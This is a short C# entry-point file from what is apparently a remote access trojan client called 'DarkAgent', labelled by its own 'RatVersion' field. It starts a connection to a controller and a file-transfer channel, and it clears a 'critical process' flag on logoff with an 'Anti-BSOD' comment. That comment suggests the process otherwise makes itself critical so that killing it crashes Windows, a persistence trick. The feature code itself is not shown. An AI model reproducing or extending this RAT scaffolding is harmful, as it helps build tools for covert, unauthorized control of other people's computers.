using System.Windows.Forms;
using DarkAgent_Client.src.Features;
using DarkAgent_Client.src.Network.DataNetwork;
using DarkAgent_Client.src.Network.DataNetwork.Packets;
using DarkAgent_Client.src.Network.FileNetwork;
using DarkAgent_Client.src.Utils;
using Microsoft.Win32;
using DarkAgent_Client.src.Network.FileNetwork.Packets;

namespace DarkAgent_Client
{
    class Program
    {
        public static string RatVersion = "1.0";
        public static ClientConnect Client;
        static void Main()
        {
            SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
            if (LoadFeatures.Load() == false)
                return;

            ClientPacketProcessor.Initialize();
            Client = new ClientConnect();
            FileClientPacketProcessor.Initialize();
            FileTransferConnect _FileTransfer = new FileTransferConnect();
            Application.Run();
        }

        static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            SystemProcess.SetCritical(false); //Anti-BSOD
        }
    }
}